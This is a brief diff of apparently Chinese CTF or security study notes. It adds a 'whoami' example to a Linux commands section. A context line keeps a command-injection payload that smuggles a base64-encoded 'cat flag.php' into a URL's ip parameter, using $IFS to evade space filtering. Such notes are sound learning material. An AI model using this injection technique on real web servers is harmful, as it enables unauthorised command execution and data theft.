@@ -165,6 +165,14 @@ http://xxx/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
 
 这个命令的目的是以一种较隐蔽的方式显示 "flag.php" 文件的内容。
 
+### Linux 基本命令
+
+查看当前登录用户名
+
+```bash
+whoami
+```
+
 ## 端口扫描
 
 ### nmap
